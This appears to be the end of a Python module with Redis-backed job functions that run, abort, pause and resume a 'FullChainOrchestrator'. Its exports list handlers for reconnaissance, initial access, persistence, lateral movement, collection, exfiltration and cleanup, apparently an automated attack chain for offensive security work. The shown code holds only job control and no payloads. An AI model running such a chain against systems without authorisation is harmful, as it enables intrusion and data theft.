    config = ChainConfig(**chain_config_dict)
    
    # Create orchestrator
    orchestrator = FullChainOrchestrator(scan_id=scan_id)
    chain_id = orchestrator.create_chain(config)
    
    # Store chain ID in Redis for abort/resume
    redis_conn.set(f"chain:{chain_id}:status", "running")
    redis_conn.set(f"chain:{chain_id}:scan_id", str(scan_id))
    
    # Execute with abort check
    def check_abort():
        while True:
            status = redis_conn.get(f"chain:{chain_id}:status")
            if status and status.decode() == "abort":
                orchestrator.abort("Redis abort signal")
                break
            elif status and status.decode() == "pause":
                orchestrator.pause()
            elif status and status.decode() == "resume":
                orchestrator.resume()
                redis_conn.set(f"chain:{chain_id}:status", "running")
            time.sleep(1)
    
    # Start abort checker thread
    import threading
    abort_thread = threading.Thread(target=check_abort, daemon=True)
    abort_thread.start()
    
    # Execute chain
    result = orchestrator.execute()
    
    # Update Redis status
    final_status = "completed" if result.get('success') else "failed"
    if result.get('aborted'):
        final_status = "aborted"
    
    redis_conn.set(f"chain:{chain_id}:status", final_status)
    redis_conn.set(f"chain:{chain_id}:result", json.dumps(result))
    
    return result


def abort_chain_job(chain_id: str) -> bool:
    """Abort a running chain job"""
    from redis import Redis
    redis_conn = Redis()
    redis_conn.set(f"chain:{chain_id}:status", "abort")
    return True


def pause_chain_job(chain_id: str) -> bool:
    """Pause a running chain job"""
    from redis import Redis
    redis_conn = Redis()
    redis_conn.set(f"chain:{chain_id}:status", "pause")
    return True


def resume_chain_job(chain_id: str) -> bool:
    """Resume a paused chain job"""
    from redis import Redis
    redis_conn = Redis()
    redis_conn.set(f"chain:{chain_id}:status", "resume")
    return True


def get_chain_status(chain_id: str) -> Dict:
    """Get chain status from Redis"""
    from redis import Redis
    redis_conn = Redis()
    
    status = redis_conn.get(f"chain:{chain_id}:status")
    result = redis_conn.get(f"chain:{chain_id}:result")
    
    return {
        'chain_id': chain_id,
        'status': status.decode() if status else 'unknown',
        'result': json.loads(result) if result else None
    }


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    # Enums
    'ChainPhase',
    'StepStatus',
    'ChainPriority',
    
    # Dataclasses
    'ChainStep',
    'ChainCheckpoint',
    'ChainConfig',
    'ChainState',
    
    # Handlers
    'StepHandler',
    'ReconHandler',
    'InitialAccessHandler',
    'PersistenceHandler',
    'LateralMovementHandler',
    'CollectionHandler',
    'ExfiltrationHandler',
    'CleanupHandler',
    
    # Main class
    'FullChainOrchestrator',
    
    # RQ functions
    'execute_chain_job',
    'abort_chain_job',
    'pause_chain_job',
    'resume_chain_job',
    'get_chain_status',
]
